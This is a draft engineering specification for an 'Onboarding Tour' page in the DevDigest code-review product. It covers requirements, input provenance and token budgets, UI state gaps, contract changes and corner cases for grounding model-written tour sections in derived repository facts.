# Onboarding Tour — orient a developer who just opened this repository

**Status:** draft
**Packages touched:** server, client, `@devdigest/shared`
**Design source:** `design-mocks/src/24-screen_tour_context.jsx:63-81` (`ScreenTour`,
the half marked *N5 Onboarding Tour*). The other half of that file, `ScreenContext`
(`24-screen_tour_context.jsx:103-139`), is **Project Context — already shipped**
(`specs/09-project-context.md`, `client/src/app/repos/[repoId]/context/`) and is not
re-specified here.
**Supersedes:** nothing
**Borders on:** `specs/09-project-context.md` — the discovered `.md` document set is an
*input* to this feature (P6 below); this feature never lists, attaches or edits a
document. `specs/08-blast-radius.md` — that feature is PR-scoped
(`BlastService.forPull`, `server/src/modules/blast/service.ts:27`) and is **not**
reused; this feature calls the `repoIntel` facade directly, the way `blast` itself
does.

---

## Problem

A developer opening an unfamiliar repository in DevDigest today can see its pull
requests, its conventions and its `.md` documents, and nothing that answers "where do
I start". `repo-intel` has already computed the answer to most of that question —
PageRank file importance (`server/src/modules/repo-intel/pipeline/rank.ts:16-70`),
an import graph (`file_edges`, `server/src/db/schema/repo-intel.ts:55-68`), dependency
chains from the top-ranked files (`RepoIntelService.getCriticalPaths`,
`server/src/modules/repo-intel/service.ts:670-709`, whose own doc comment names this
use case: *"onboarding reading-path"*, `service.ts:665-668`) — and **nothing reads
it**. `getCriticalPaths` and `getTopFilesByRank` have no call site in the product.

The wire for the feature is likewise laid and dead:

| Already exists | Where | State |
| --- | --- | --- |
| `Onboarding` / `OnboardingSection` / `OnboardingLink` Zod contracts | `server/src/vendor/shared/contracts/knowledge.ts:28-47` | never imported by any producer or consumer |
| `onboarding` table (`repo_id` PK, `json`, `generated_at`) | `server/src/db/schema/context.ts:120-126` | never read, never written |
| `FEATURE_MODELS` entry `onboarding` — label *"Onboarding Tour"*, *"Writes the per-repo onboarding tour."*, default `openrouter` / `deepseek/deepseek-v4-flash` | `server/src/vendor/shared/contracts/platform.ts:43-50`, mirrored at `client/src/lib/feature-models.ts:14-20` | selectable in Settings, resolves to nothing |
| System prompt template with a `{{sections}}` placeholder, grounding rules, a SECURITY paragraph and mermaid rules | `server/src/prompts/onboarding.system.md` | loaded by nothing (`server/src/platform/prompts.ts:23` names it only as an example) |
| Message namespace with `title`, `regenerate`, `generate.*`, `loadError.*` | `client/messages/en/onboarding.json` | rendered by no component |
| Nav label `"onboarding-tour": "Onboarding Tour"` | `client/messages/en/shell.json:19` | no nav entry uses it (`client/src/vendor/ui/nav.ts:21-44`) |
| `MermaidDiagram` (validates with `mermaid.parse` before render, `securityLevel: "strict"`) and `react-markdown` + `remark-gfm` | `client/src/components/mermaid-diagram/MermaidDiagram.tsx:17-45`, `client/package.json:17,22,24` | ready |

So the cost of this feature is much lower than it looks: the analysis is largely
already computed and persisted, and most of the contract, storage, model-selection
and rendering wire is in place. **The work is the derivation layer, two grounded model
calls, and one screen.**

`/onboarding` in the client is **not** this feature — it is the add-repository
first-run wizard (`client/src/app/onboarding/page.tsx:1-9`, `AddRepoView.tsx:1-4`,
design mock 15, e2e flow `e2e/specs/06-onboarding.flow.json`). Wiring the tour into
that route would replace a screen that ships today.

## Goals

- G1 · A developer who has never seen the repository can, from one page, name where
  the code lives, how a request moves through it, how to get it running, what to read
  in what order, and what to attempt first.
- G2 · Every path the page shows resolves to a file that exists **at the moment it is
  rendered**, not merely at the moment it was generated.
- G3 · The generative part of the page is bounded: the model phrases and orders facts
  the server derived; it never supplies a path, a command, or a difficulty label.
- G4 · Generating a tour is a priced, budgeted, cached, one-shot operation with the
  same failure posture as PR Brief — degrade, persist, explain, never `5xx`.

## Non-goals

- N1 · Editing a tour, annotating it, or letting a maintainer pin sections. Read-only.
- N2 · Multi-repo or org-level onboarding. One repo, one tour.
- N3 · Tracking whether a developer read a section, or a progress checklist.
- N4 · Turning a first task into a branch, an issue, or an agent run.
- N5 · Any change to how `repo-intel` indexes, or to `getBlastRadius`'s one-hop
  reach (`specs/08-blast-radius.md:37` puts that out of scope and it stays out).
- N6 · Non-JS/TS analysis. The indexer parses `.ts/.tsx/.js/.jsx/.mjs/.cjs` only
  (`server/src/modules/repo-intel/constants.ts:16`); a Python repo gets a tour built
  from config files and the file walk, and the page must say so (C3).
- N7 · Retrieval/embedding over the repo's documents. `specs/09-project-context.md:61-63`
  rules that out and no infrastructure is added here.

---

## Scope — in / out

**In:**
- `GET /repos/:id/tour` and `POST /repos/:id/tour` on the server, plus a derivation
  layer over the existing `repoIntel` facade, the clone's config files and the
  discovered document set.
- Exactly two structured model calls per generation (R7).
- The client page at `/repos/[repoId]/tour`, its nav entry, its empty state, its
  loading, stale, degraded and error states.
- Contract additions in `@devdigest/shared` (see *Contract changes*).

**Out:**
- The Project Context screen and everything in `specs/09-project-context.md`.
- The `/onboarding` add-repository wizard, which is untouched.
- A `routes_and_apis` section. `server/src/prompts/onboarding.system.md` names one;
  the five sections agreed for this feature do not include it, and its endpoint facts
  fold into *Critical paths* instead (R3).
- Sharing a tour outside the app. The mock draws a *Share link* control
  (`24-screen_tour_context.jsx:79`); there is no sharing surface in this product
  (→ Q1).

---

## Requirements

| ID | Requirement | Source |
| --- | --- | --- |
| R1 | `GET /repos/:id/tour` returns `200` with `TourRecord \| null` — "no tour" is a state, not a `404`, matching `GET /pulls/:id/brief` (`server/src/modules/brief/routes.ts:29-53`). `POST /repos/:id/tour` with `{ force?: boolean }` generates or returns the cached record and always answers `200`. | house pattern · brief precedent |
| R2 | **Architecture is derived, narrated.** The nesting — every directory to depth 3 with its file count, its role mix from `_shared/file-roles.ts`, its highest-ranked file from `file_rank`, and the directory-to-directory import edges aggregated from `file_edges` — is computed in code, not by the model. The model writes only the prose `body` and one sentence per directory. The mermaid `diagram` is **rendered from the aggregated directory edges in code**; the model never authors it. | request 1 · `repo-intel/repository.ts:432-437` · `schema/repo-intel.ts:55-68,105-121` |
| R3 | **Critical paths are derived, narrated.** The chains come from `repoIntel.getCriticalPaths(repoId)` (`service.ts:670-709`) — up to `CRITICAL_PATH_ROOTS = 5` chains of depth `BFS_DEPTH = 2` (`service.ts:713`) — each annotated with the HTTP endpoints and crons its files declare, from `file_facts` (`schema/repo-intel.ts:75-88`). The model writes only a one-sentence "why this path matters" per chain. It may not add, remove or reorder a chain's files. | request 2 · `service.ts:670-713` |
| R4 | **How to run is model-generated**, from derived config facts only: `package.json` `scripts`/`packageManager`/`engines`, the lockfile present (→ package manager), the variable **names** in `.env.example`/`.env.sample`, `docker-compose*.yml` service names, and `Dockerfile` presence — all read through `container.git.readFile` (`server/src/adapters/git/simple-git.ts:128-130`). This is the one section whose content is written rather than assembled. | request 3 (explicit) |
| R5 | **Every emitted run step's command is checked verbatim in code against a whitelist derived from those same config facts** — `<pm> <script>` for each declared script, `<pm> install`, `docker compose up -d <service…>`, `cp .env.example .env`, and nothing else. A step whose command is not in the whitelist is **dropped before persistence** and counted. A command string is the only model output in this product that a human is invited to paste into a shell (`24-screen_tour_context.jsx:53`, the Copy control); it may not be free text. | R4 · security |
| R6 | **Guided reading is derived, narrated.** The ordered file list comes from `repoIntel.getTopFilesByRank(repoId, n, { exclude })` (`service.ts:646-663`) intersected with the `getCriticalPaths` chain heads, in rank order. The model writes only the `why` sentence per entry and may not change the order or the set. | request 4 · `service.ts:646-709` |
| R7 | Generation makes **exactly two** structured model calls, issued **concurrently**, each with `maxRetries: 0` (`specs/10-pr-brief.md:390-401`, amendment A-1). Call **A — narrative**: architecture prose, per-directory sentences, critical-path whys, reading whys. Call **B — practical**: run steps and first-task selection. The split is because their inputs are disjoint — A needs the graph, B needs configs and task candidates — so a single call would carry both inputs, and because one call's structured output would have to hold five sections at once. A failure in one degrades only its own sections (R17). | settled decision · brief precedent |
| R8 | **First tasks are selected, not invented.** The server derives at most 12 candidates, each carrying its own evidence: `missing_test` (a `core`-role file per `_shared/file-roles.ts:29` with no matching test file), `todo_marker` (a `TODO\|FIXME\|HACK` hit with path and line from `container.codeIndex.grep`, `server/src/adapters/codeindex/ripgrep.ts:50-54`), `unresolved_reference` (`repoIntel.getUnresolvedReferences`, `service.ts:585-634` — a real phantom-API cleanup), `undocumented_endpoint` (a `file_facts.endpoints` entry whose file is named in no discovered document). Call B may **select at most 6 and rewrite their titles**; it may not add one. A task whose `candidate_id` is absent from the input is dropped before persistence. | request 5 · grounding |
| R9 | **Difficulty is derived, never modelled.** For each selected task's `scope` path: `C` = distinct caller files from `repoIntel.getBlastRadius(repoId, [scope])` (`service.ts:221-305`/`316-398` — the facade takes an arbitrary file list, unlike `modules/blast`, which takes a PR), `P` = `file_rank.percentile` (`schema/repo-intel.ts:105-121`). **low** when `C ≤ 2` and `P < 50`; **high** when `C > 15` or `P ≥ 90`; **medium** otherwise. A scope with no `file_rank` row gets `low` with basis `no_index_signal`. Any `difficulty` value the model emits is discarded. The record persists `C`, `P` and the basis, and the card renders them next to the badge, so the label is auditable rather than an opinion. | request 5 · settled decision |
| R10 | Every path the tour emits — `links[].path`, reading entries, chain files, task `scope`, and any backticked path inside a `body` — is checked in code against the reference set built from the derived facts (the indexed file list, the walked directory list, and the discovered document paths). An unresolvable path is dropped before persistence and counted in `dropped_refs`, mirroring `groundBrief` (`server/src/modules/brief/grounding.ts:38-74`). This module gets its **own** grounding implementation; `pnpm arch`'s `no-cross-module-internals` forbids importing `modules/brief`'s (`specs/10-pr-brief.md:358-362`). | R2-R8 · `brief/grounding.ts:38-74` |
| R11 | **Read-time re-resolution.** On every `GET`, each stored path is re-checked against the *current* index; one that no longer resolves is rendered struck-through and non-clickable with a "no longer in the repo" note, and is excluded from any count. A tour never presents a deleted file as a live link, even before anyone regenerates. | G2 · request (staleness) |
| R12 | The tour is cached per **repo state**, defined as `(repo_id, indexed_sha, indexer_version, prompt_version, provider, model)`. `GET` and a `POST` without `force` return the cached row when every component matches; `POST { force: true }` regenerates. Staleness is **structural** — the key *is* the state, so a re-index is a cache miss and the superseded row is left in place, exactly as `pr_brief_records_state_uq` does (`server/src/db/schema/reviews.ts:143-151`, `server/INSIGHTS.md:304-314`). | request (staleness) · brief precedent |
| R13 | When `repo_index_state.last_indexed_sha` (`schema/repo-intel.ts:35-48`) differs from the record's `indexed_sha`, the page renders the tour with a stale marker naming the 7-character sha it was generated against, and **does not regenerate automatically** — the same posture as a moved `head_sha` on a brief (`specs/10-pr-brief.md` A14). | request (staleness) |
| R14 | The pre-flight budget is measured with `container.tokenizer.count` (`server/src/adapters/tokenizer/index.ts:29`) over **`system + user + JSON.stringify(<that call's response JSON schema>)`**. Ceilings: call A **7 000**, call B **4 000**. Over ceiling, inputs are dropped in the *Provenance* order and re-measured; still over after every droppable input is gone, that call is not made and its sections are persisted degraded with `error: 'input_over_budget'`. | `server/INSIGHTS.md:286-302` · `specs/10-pr-brief.md:132` |
| R15 | The record persists, per call, `budget_tokens` (R14's pre-flight number) **and** `tokens_in` (the provider's own `usage.input_tokens`, `server/src/adapters/llm/anthropic.ts:120,161` / `openai.ts:91,126`), plus `tokens_out`, `cost_usd`, `provider`, `model`, `prompt_version`, `dropped_inputs[]`, `dropped_refs`, `dropped_steps`, `generated_at`. Persisting both counts is what made the brief's envelope undercount visible in one query (`server/INSIGHTS.md:300-301`). `POST /repos/:id/tour` runs outside any agent run, so no `run_traces` row carries them. | `server/INSIGHTS.md:286-302` |
| R16 | Repository-derived text is **untrusted**: file and directory paths, symbol names, `package.json` script names and values, `.env.example` variable names, docker-compose service names, `TODO` comment text, and the contents of any injected document. All go inside `wrapUntrusted(label, content)` (`reviewer-core/src/prompt.ts:45-49`). Because this call does not go through `assemblePrompt`, the tour's system prompt carries its own injection guard, as `BRIEF_INJECTION_GUARD` does (`server/src/modules/brief/constants.ts:51-56`, `specs/10-pr-brief.md:367-370`). `server/src/prompts/onboarding.system.md:9-11` already carries an equivalent paragraph and is the place it lives. | request (untrusted input) |
| R17 | Every failure degrades: no provider key, a timeout, a malformed structured response, an over-budget call, or a missing clone file writes a record with `degraded: true` and a human-readable `error`, and the page renders that plus a *Retry* that sends `force: true` (`specs/10-pr-brief.md:403-413`, amendment A-2). Because R7 makes two independent calls, a **partial** tour is a normal outcome: the sections whose call succeeded render, the others render an inline "couldn't generate this section" with the reason. No model failure returns a `5xx` and none renders blank. | `specs/10-pr-brief.md:139` |
| R18 | If the repo has no `repo_index_state` row, or its `status` is `failed`, the page shows "this repo isn't indexed yet" with a link to the existing `POST /repos/:id/resync` (`server/src/modules/repo-intel/routes.ts:43-65`) and the *Generate* control is disabled. When `status` is `partial` or `degraded`, generation proceeds and the tour carries a banner naming the degradation and the `files_skipped` count. | `schema/repo-intel.ts:35-48` |
| R19 | `@devdigest/shared` gains the section payloads and `TourRecord`, and narrows `OnboardingSection.kind` from `z.string()` to a five-value enum. The existing `Onboarding`, `OnboardingSection` and `OnboardingLink` shapes are **extended, not replaced** (`contracts/knowledge.ts:28-47`) — no other consumer exists to break. | contract hygiene |
| R20 | The page lives at `/repos/[repoId]/tour`, beside `context/` and `conventions/` (`client/src/app/repos/[repoId]/`). `/onboarding` remains the add-repository wizard. A nav entry `{ key: "onboarding-tour", href: "/repos/:repoId/tour" }` joins the `WORKSPACE` group in `client/src/vendor/ui/nav.ts:21-27` using the label that already exists at `client/messages/en/shell.json:19` — that file's comment (`nav.ts:33-35`) forbids adding a nav item before its screen exists, so the entry lands with the page and not before. | design `24-screen_tour_context.jsx:64,66` |
| R21 | Every new user-facing string is a `next-intl` key in the **existing** `client/messages/en/onboarding.json` namespace. Its `generate.body` today names a *different* five sections ("overview, architecture, key modules, getting started, and conventions & gotchas") and must be rewritten to the five this spec builds. A hardcoded literal is a defect. | `client/messages/en/onboarding.json:10` · `client/src/i18n/request.ts:9-12` |
| R22 | `POST /repos/:id/tour` is rate-limited to **5/min** — it spends money and its unit is a whole repository, so it is stricter than the brief's 10/min (`server/src/modules/brief/routes.ts:42`). | house pattern |
| R23 | Markdown `body` fields render through the existing `react-markdown` + `remark-gfm` path with raw HTML disabled, and the architecture diagram through `MermaidDiagram` (`client/src/components/mermaid-diagram/MermaidDiagram.tsx:17-45`), which already validates with `mermaid.parse` before rendering so an invalid diagram degrades instead of injecting a syntax-error graphic. | `onboarding.system.md:36-38` · client wire |

---

## Provenance of inputs

One row per input to a model call. **Budget** sums to that call's R14 ceiling.
**Drop order** is the sequence R14 applies — highest number goes first.

### Call A — narrative (ceiling 7 000)

| # | Input | Source (`path:line`) | Trust | If missing | Budget | Drop order |
| --- | --- | --- | --- | --- | --- | --- |
| P1 | Instructions, section list, output schema, labels | `server/src/prompts/onboarding.system.md` (`{{sections}}`), rendered by `renderPrompt` (`server/src/platform/prompts.ts:39-41`) | **trusted** — outside every wrapper (R16) | n/a | 900 | never |
| P2 | Repo name, primary language mix, file/dir counts, `repo_index_state.status` + `files_skipped` | `repo_index_state` (`schema/repo-intel.ts:35-48`) | trusted (integers, enum) | no row → R18 blocks generation | 150 | never |
| P3 | Directory tree to depth 3: path, file count, role mix, top-ranked file | derived from the indexed file list + `file_rank` (`schema/repo-intel.ts:105-121`) + `_shared/file-roles.ts:29` | **untrusted** (paths) — wrapped | empty index → R18 | 1 800 | 4 — depth 3 first, then depth 2 |
| P4 | Directory-level import edges | aggregated from `file_edges` (`schema/repo-intel.ts:55-68`, read at `repo-intel/repository.ts:432-437`) | trusted (derived) | no edges → architecture body still written, diagram omitted (C4) | 800 | 3 |
| P5 | Critical-path chains + their endpoints/crons | `getCriticalPaths` (`service.ts:670-709`), `file_facts` (`schema/repo-intel.ts:75-88`) | **untrusted** (paths, endpoint strings) — wrapped | empty → section renders "no chains found" (C5) | 900 | never — it is R10's reference set |
| P6 | Root `README.md` + up to 1 further discovered document whose path matches `architecture\|contributing\|overview`, whole, capped | `GET /repos/:id/context` discovery (`server/src/modules/project-context/discovery.ts:1-53`), content via `container.git.readFile` | **untrusted** — wrapped (R16) | absent → omitted, no failure | 1 500 | 1 — first to go |
| P7 | Top-ranked file list with rank percentiles | `getTopFilesByRank` (`service.ts:646-663`) | **untrusted** (paths) — wrapped | empty → guided reading degrades to the chain heads | 600 | never — it is R6's set |
| P8 | Signatures of the exported symbols in the top 20 ranked files | `getSymbolsInFiles` (`service.ts:432-445`) | **untrusted** — wrapped | empty → omitted | 900 | 2 |

### Call B — practical (ceiling 4 000)

| # | Input | Source (`path:line`) | Trust | If missing | Budget | Drop order |
| --- | --- | --- | --- | --- | --- | --- |
| P9 | Instructions, output schema, the derived command whitelist | written here + derived from P10 | **trusted** | n/a | 700 | never |
| P10 | Config facts: `package.json` `scripts`/`packageManager`/`engines`, lockfile name, `.env.example` variable **names**, docker-compose service names, `Dockerfile` presence | `container.git.readFile` (`server/src/adapters/git/simple-git.ts:128-130`) | **untrusted** — wrapped (R16) | none present → how-to-run renders "no runnable configuration found" (C6) | 1 200 | never — it is R5's whitelist |
| P11 | First-task candidates with evidence (`candidate_id`, kind, scope, line, snippet ≤120 chars) | R8's four generators | **untrusted** — wrapped | zero candidates → first tasks renders "nothing obvious to start on" (C7) | 1 400 | never — it is R8's reference set |
| P12 | Difficulty inputs `C` and `P` per candidate | `getBlastRadius` (`service.ts:221-305`), `file_rank` | trusted (integers) | missing → `no_index_signal` (R9) | 300 | 2 |
| P13 | Repo name + language mix (for phrasing) | `repo_index_state` | trusted | n/a | 100 | 1 |

**No `.env`/`.env.local` value, no secret, and no file content outside P6 and P11's
120-character snippets ever enters either call.** `.env.example` contributes variable
*names* only.

---

## Design analysis

### States the design covers

`24-screen_tour_context.jsx:63-81` draws exactly two:

1. **Empty** — `EmptyState` with icon `Boxes`, the CTA *"Generate onboarding tour"*,
   and the body *"…Takes 30–60s and ~5,000 tokens."* (`:64`).
2. **Populated** — a sticky "On this page" rail over the five section ids
   (`architecture_overview`, `critical_paths`, `how_to_run`, `guided_reading`,
   `first_tasks`, `:3-13`), a header reading *"Generated from index of 12,450 files ·
   last refreshed 2h ago"* (`:74`), *Regenerate* and *Share link* controls (`:75-76`),
   and five collapsible sections, all drawn open (`:30`).

Per-section shapes drawn: prose + one diagram (architecture, `:5,45`); a file list with
per-file descriptions and an *Open* button (`:7,46-50`); numbered command steps with a
Copy affordance (`:9,51-55`); a numbered reading list with `path` + `why` (`:11,56-60`);
and a 3-column task grid with `t`/`scope`/`cx` where `cx` renders as a `"<cx> complexity"`
badge, green for `Low` and amber otherwise (`:13,61-65`).

### States it does not

| Axis | Gap in the mock | Requirement |
| --- | --- | --- |
| Emptiness | The empty state assumes the repo is indexed. A repo with no index, a failed index, or zero JS/TS files is not drawn at all. | R18, C1, C3 |
| Emptiness | No per-section empty state. Every one of the five is drawn with content; the mock never shows a section that came back with nothing. | C5, C6, C7 |
| Cardinality | One directory / one file: the architecture diagram of a single-directory repo, and a critical-paths section with one chain. Also the many: the mock draws 4 files, 3 steps, 3 reading entries, 3 tasks — `getCriticalPaths` returns up to 5 chains × 3 files and R8 selects up to 6 tasks, which overflows a 3-column grid to two ragged rows. | C2, C8 |
| Extremes | The longest real string: a 180-character monorepo path in `MonoLink` (`:48`), a `package.json` script whose command is 400 characters, a directory name that breaks the mermaid node label rule the prompt itself warns about (`onboarding.system.md:31-34`). | C9, C10 |
| Time | The mock shows no loading state and no in-flight *Regenerate*. Generation is a 60-second operation (NFR *Latency*); nothing is drawn for those 60 seconds. | C11 |
| Time | "last refreshed 2h ago" (`:74`) is drawn as decoration. Nothing shows that the *index* moved since — which is the only staleness that matters (R13). | R13, C12 |
| Failure | No degraded, no partial, no error state. With two independent calls (R7), a half-generated tour is a routine outcome and the mock has no shape for it. | R17, C13 |
| Permission | Not applicable — DevDigest has no per-user authorization surface today; any viewer of a repo sees everything about it (`server/src/modules/repos/routes.ts` has no viewer scoping). Recorded as considered, not as a gap. | n/a |
| Concurrency | Two viewers pressing *Regenerate* at once, and a `resync` completing mid-generation. The brief's upsert is knowingly non-atomic (`server/INSIGHTS.md:304-314`) and this one inherits that. | C14, C15 |
| Reachability | The mock's `AppFrame` uses `active: "onboarding-tour"` (`:64`) but `nav.ts` has no such entry, so there is no drawn route in. Nothing says what the back button does from an anchored section, or whether `#critical_paths` is linkable from elsewhere. | R20, C16 |

### Divergence from `client/` today

| Mockup | Today (`path:line`) | Intended change (→ Rn) or mockup oversight (→ Qn) |
| --- | --- | --- |
| Nav item `onboarding-tour` | No such entry; `nav.ts:33-35` explicitly forbids adding one before its screen exists | **Intended** → R20, landed with the page |
| Empty-state body: *"architecture, critical paths, how to run, a reading order, and first tasks"* (`:64`) | `client/messages/en/onboarding.json:10` says *"overview, architecture, key modules, getting started, and conventions & gotchas"* | **Intended** — the mock is the design; the message string is stale wire → R21 |
| *"~5,000 tokens"* (`:64`) | No estimate exists anywhere | **Oversight** — R14's ceilings sum to 11 000 pre-flight and the billed number is higher again (`server/INSIGHTS.md:286-302`). The copy must state a range grounded in R15's recorded numbers → Q2 |
| *"Takes 30–60s"* (`:64`) | No timing exists | **Intended, achievable** — R7's two calls run concurrently, so wall clock is one call's 45 s timeout plus derivation → NFR *Latency* |
| Section id `architecture_overview` (`:4`) | `OnboardingSection.kind` is `z.string()` (`contracts/knowledge.ts:37`); `onboarding.system.md:27` says `architecture` and adds a `routes_and_apis` section | **Intended** — the mock's five ids win, the enum narrows to them, `routes_and_apis` is dropped → R19, Scope *Out* |
| *Share link* control (`:76`) | No sharing surface exists in the product | **Oversight** → Q1 (default: omit) |
| `cx: "Low" \| "Medium"` badge, no basis shown (`:13,64`) | Nothing exists | **Intended** — the badge gains its derived basis inline, or the label is an unfalsifiable opinion → R9 |
| Architecture diagram drawn as hand-laid SVG (`TourMermaid`, `:15-28`) | `MermaidDiagram` exists and is the house renderer (`MermaidDiagram.tsx:17-45`) | **Intended** — the mock's SVG is mock scaffolding; ship mermaid → R23 |
| *Open* button per critical-path file (`:50`) | No file-viewer route exists in the client | **Oversight** → Q3 (default: link to the file on the host provider) |
| Sections all default open (`:30`) | n/a | **Intended** — keep; a collapsed-by-default tour hides the thing the page exists to show |

### UX improvements proposed

- **`proposed` · Show the difficulty basis next to the badge** — "Low · 1 caller ·
  rank p31". Reason: a bare *Low complexity* on a generated card is a claim a newcomer
  cannot check, and the one thing that costs them a day is picking a task that turns
  out to touch forty files. This is the reason R9 makes difficulty derived at all.
- **`proposed` · Put the *stale* marker in the header, not in a banner** — the mock's
  header already carries "Generated from index of 12,450 files · last refreshed 2h ago"
  (`:74`), which is the natural home for "index has moved to `a1b2c3d`". Reason: it
  answers the question at the moment the reader is already reading the freshness line,
  instead of adding a second dismissible thing to ignore.
- **`proposed` · Make the "On this page" rail reflect what actually generated** —
  grey out a section that came back degraded rather than scrolling to an error card.
  Reason: with two independent calls (R7), the rail is the only place a reader learns
  the tour is partial before scrolling.
- **`proposed` · Sort first tasks by difficulty ascending** — the mock's grid order is
  arbitrary. Reason: the section's stated purpose is "so a person can choose by
  confidence", and confidence reads top-left first.

---

## Module interaction

| From → to | Contract | Sync? | If the far side fails | Requirement |
| --- | --- | --- | --- | --- |
| client → server | `GET /repos/:id/tour` → `TourRecord \| null` | sync | request fails → `loadError.title` (`client/messages/en/onboarding.json:15`) + retry; a cached React Query result stays visible | R1, R17 |
| client → server | `POST /repos/:id/tour` `{force?}` → `TourRecord` | sync, up to 60 s | timeout at the client → the record is still being written server-side; the client re-`GET`s rather than reporting failure | R7, C11 |
| tour service → `repoIntel` facade | `getCriticalPaths`, `getTopFilesByRank`, `getSymbolsInFiles`, `getUnresolvedReferences`, `getBlastRadius`, `getFileRank` (`repo-intel/types.ts:137-172`) | sync, in-process, DB-backed, no model call | index missing/failed → R18 blocks; `degraded`/`partial` → generate with a banner | R2, R3, R6, R8, R9, R18 |
| tour service → `container.git` | `readFile(repo, path)` (`simple-git.ts:128-130`) | sync, filesystem | file absent → that config fact is simply absent; a clone absent → degrade with `clone_unavailable` | R4, C6 |
| tour service → `container.codeIndex` | `grep(repo, pattern)` (`ripgrep.ts:50-54`) — ripgrep when resolvable, pure-Node walk otherwise | sync | throws or times out → the `todo_marker` generator yields zero candidates; the other three still run | R8 |
| tour service → project-context discovery | `discoverDocuments(root)` (`discovery.ts:1-53`) — used for P6 and for R8's `undocumented_endpoint` | sync, re-reads the clone per call | throws → P6 omitted, `undocumented_endpoint` yields nothing | P6, R8 |
| tour service → LLM adapter | `completeStructured` × 2, concurrent, `maxRetries: 0`, `timeoutMs: 45_000` | sync per call | either call throws/times out → that call's sections degrade, the other still persists | R7, R17 |
| tour service → `_shared/feature-models` | `resolveFeatureModel(container, workspaceId, 'onboarding')` (`server/src/modules/_shared/feature-models.ts:56-62`) | sync | no override → the registry default `openrouter`/`deepseek/deepseek-v4-flash` (`platform.ts:43-50`) → Q4 | R12, R15 |

---

## Contract changes

`@devdigest/shared` (`server/src/vendor/shared/contracts/knowledge.ts:28-47`) — extend,
never replace:

- `OnboardingSectionKind` — new enum: `architecture_overview` · `critical_paths` ·
  `how_to_run` · `guided_reading` · `first_tasks`. `OnboardingSection.kind` narrows from
  `z.string()` to it (R19).
- `OnboardingSection` gains five optional, kind-specific payloads: `tree[]`
  (`{ path, files, role_mix, top_file, note }`), `paths[]` (`{ files[], endpoints[], why }`),
  `run_steps[]` (`{ command, why }`), `reading[]` (`{ path, why }`), `tasks[]`
  (`{ candidate_id, title, scope, why, difficulty, difficulty_basis: { callers, rank_percentile, signal } }`).
  `body`, `diagram` and `links` keep their current meaning.
- `TourDifficulty` — new enum `low | medium | high` (R9). Deliberately **not** reusing
  `RiskSeverity`: a starter task's difficulty is not a risk level and conflating them
  would make one enum answer to two features.
- `TourRecord` — `Onboarding` extended with the R12 key components, the R15 trace fields
  (per call: `budget_tokens`, `tokens_in`, `tokens_out`, `cost_usd`), `degraded`,
  `error`, `degraded_sections[]`, `dropped_refs`, `dropped_steps`, `generated_at`.
- The `onboarding` table as it stands (`repo_id` PK, `json`, `generated_at`,
  `schema/context.ts:120-126`) **cannot express R12's key** — it has one row per repo
  and no key columns. The state key and the trace fields must be real columns, on the
  pattern of `pr_brief_records` (`schema/reviews.ts:113-153`), or R12's cache-miss-on-
  re-index is unimplementable. Whether that is a migration on `onboarding` or a new
  table is the planner's call; the requirement is that the key is structural.
- `FEATURE_MODELS` and `FeatureModelId` are **unchanged** — `onboarding` already exists
  (`platform.ts:43-50`).

---

## Corner cases

| ID | Case | Expected behaviour | Requirement |
| --- | --- | --- | --- |
| C1 | Repo imported but never indexed, or `repo_index_state.status = 'failed'` | Page renders "this repo isn't indexed yet", a *Resync* link to `POST /repos/:id/resync`, and a **disabled** *Generate* control. No model call, no record written. | R18 |
| C2 | Repo has one directory and three files | Architecture renders the prose and a one-node diagram; `getCriticalPaths` returns at most one chain; guided reading lists the three files. No section is hidden for being small. | R2, R3, C5 |
| C3 | Repo is Python/Go — zero `.ts/.js` files, so `symbols`, `file_edges` and `file_rank` are all empty (`repo-intel/constants.ts:16`) | Architecture is built from the directory walk and `package`/config files alone and its `body` states that call-graph analysis does not cover this language; critical paths and guided reading render "not available for this repository's languages"; how-to-run and first tasks (via `todo_marker`) still work. | N6, R18, C5 |
| C4 | `file_edges` is empty but files exist | Architecture prose is written; `diagram` is `null` — never an empty string or a placeholder (`onboarding.system.md:35`). The client renders no diagram box rather than an empty one. | R2, R23 |
| C5 | `getCriticalPaths` returns `[]` | Critical paths renders "no dependency chains found — the import graph is empty or too shallow", not an empty card. | R3 |
| C6 | No `package.json`, no compose file, no Dockerfile | R5's whitelist is empty, so every emitted step is dropped. The section renders "no runnable configuration found in this repository" and `dropped_steps` records the count. Call B still returns first tasks. | R4, R5 |
| C7 | Zero first-task candidates (fully tested repo, no TODOs, no phantom refs) | Section renders "nothing obvious to start on — this repository is unusually tidy". The model is not asked to invent one. | R8 |
| C8 | Call B selects 6 tasks against a 3-column grid | Grid wraps to two rows of three; a partial final row left-aligns. Ordering is difficulty ascending. | R8, UX |
| C9 | A `package.json` script value is 400 characters, or a path is 180 characters | The command renders in a horizontally scrollable `<code>` with the Copy control copying the **full** string; paths middle-truncate with the full value in `title` and on copy. | R5, R23 |
| C10 | A directory name contains `/`-adjacent punctuation or a newline, breaking mermaid node labels | The derived diagram quotes and strips per `onboarding.system.md:31-34`; if `mermaid.parse` still rejects it, `MermaidDiagram` suppresses and renders nothing (`MermaidDiagram.tsx:39-45`) rather than a syntax-error graphic. | R23 |
| C11 | Generation in flight for 60 s | *Generate* becomes *Generating…* (`onboarding.json` `generate.generating`) and is disabled; on a regenerate the previous tour stays fully visible and *Regenerate* is disabled (`onboarding.json` `regenerating`). Navigating away and back re-`GET`s and shows either the old tour or the new one — never a blank page. | R17, C15 |
| C12 | A file the tour links to was deleted after generation | The link renders struck-through and non-clickable with "no longer in the repo"; the section's counts exclude it; the header shows the stale marker. No automatic regeneration. | R11, R13 |
| C13 | Call A succeeds, call B times out | `degraded: true`, `degraded_sections: ['how_to_run','first_tasks']`, `error` naming the timeout. Architecture, critical paths and guided reading render normally; the two failed sections render an inline reason and a *Retry* that sends `force: true`. `cost_usd` reflects call A only. | R7, R17 |
| C14 | Two viewers press *Regenerate* within the same second | Both calls run; the last write wins on the R12 key. The upsert is knowingly non-atomic, as the brief's is (`server/INSIGHTS.md:304-314`); the failure mode is a duplicate spend, not a corrupt row, and R22's 5/min limit bounds it. | R12, R22 |
| C15 | A `resync` finishes mid-generation, moving `last_indexed_sha` | The record is persisted under the sha it was **built from**, not the current one — so on the next `GET` it is immediately marked stale (R13) and honestly describes what it read. It is not discarded. | R12, R13 |
| C16 | A user deep-links to `/repos/:id/tour#first_tasks` before a tour exists | The empty state renders and the fragment is ignored; no scroll, no error. Back returns to the referring page. | R20 |
